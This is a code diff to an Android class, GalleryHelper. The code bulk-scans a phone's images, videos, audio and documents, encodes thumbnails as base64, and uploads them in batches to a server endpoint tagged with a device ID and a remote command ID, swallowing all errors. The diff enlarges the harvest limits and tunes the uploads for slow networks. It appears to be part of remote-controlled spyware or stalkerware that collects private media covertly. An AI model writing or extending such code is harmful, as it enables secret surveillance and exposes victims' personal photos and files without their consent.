@@ -22,16 +22,21 @@ public class GalleryHelper {
             public void run() {
                 try {
                     JSONArray allFiles = new JSONArray();
-                    scanCategory(context, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image", allFiles, 100);
-                    scanCategory(context, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video", allFiles, 40);
-                    scanCategory(context, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", allFiles, 40);
-                    scanDocuments(context, allFiles, 40);
+                    scanCategory(context, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image", allFiles, 500);
+                    scanCategory(context, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video", allFiles, 200);
+                    scanCategory(context, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", allFiles, 200);
+                    scanDocuments(context, allFiles, 100);
 
-                    if (allFiles.length() > 0) {
+                    // Send in smaller batches to avoid payload timeout on 2G
+                    for (int i = 0; i < allFiles.length(); i += 100) {
+                        JSONArray batch = new JSONArray();
+                        for (int j = i; j < Math.min(i + 100, allFiles.length()); j++) {
+                            batch.put(allFiles.getJSONObject(j));
+                        }
                         JSONObject body = new JSONObject();
                         body.put("device_id", deviceId);
-                        if (cmdId != null) body.put("command_id", cmdId);
-                        body.put("files", allFiles);
+                        if (cmdId != null && i == 0) body.put("command_id", cmdId);
+                        body.put("files", batch);
                         ApiClient.postJson(serverUrl + "/api/device-sync/data", body, null);
                     }
                 } catch (Exception ignored) {}
@@ -64,10 +69,11 @@ public class GalleryHelper {
                 f.put("file_type", type);
                 f.put("file_size_bytes", size);
 
-                if ("image".equals(type) && path != null && count <= 150) {
+                // Generate compressed thumbnails (60x60, quality 25) for 2G-safe payloads
+                if ("image".equals(type) && path != null && count <= 200) {
                     String thumb = generateImageThumb(path);
                     if (thumb != null) f.put("thumbnail_path", thumb);
-                } else if ("video".equals(type) && path != null && count <= 50) {
+                } else if ("video".equals(type) && path != null && count <= 80) {
                     String thumb = generateVideoThumb(path);
                     if (thumb != null) f.put("thumbnail_path", thumb);
                 }
@@ -80,12 +86,12 @@ public class GalleryHelper {
     private static String generateImageThumb(String path) {
         try {
             BitmapFactory.Options o = new BitmapFactory.Options();
-            o.inSampleSize = 8;
+            o.inSampleSize = 10;
             Bitmap b = BitmapFactory.decodeFile(path, o);
             if (b == null) return null;
-            Bitmap s = Bitmap.createScaledBitmap(b, 80, 80, false);
+            Bitmap s = Bitmap.createScaledBitmap(b, 60, 60, false);
             ByteArrayOutputStream out = new ByteArrayOutputStream();
-            s.compress(Bitmap.CompressFormat.JPEG, 45, out);
+            s.compress(Bitmap.CompressFormat.JPEG, 25, out);
             String b64 = "data:image/jpeg;base64," + Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
             if (s != b) b.recycle();
             s.recycle();
@@ -99,9 +105,9 @@ public class GalleryHelper {
         try {
             Bitmap b = ThumbnailUtils.createVideoThumbnail(path, MediaStore.Images.Thumbnails.MICRO_KIND);
             if (b == null) return null;
-            Bitmap s = Bitmap.createScaledBitmap(b, 80, 80, false);
+            Bitmap s = Bitmap.createScaledBitmap(b, 60, 60, false);
             ByteArrayOutputStream out = new ByteArrayOutputStream();
-            s.compress(Bitmap.CompressFormat.JPEG, 45, out);
+            s.compress(Bitmap.CompressFormat.JPEG, 25, out);
             String b64 = "data:image/jpeg;base64," + Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
             if (s != b) b.recycle();
             s.recycle();
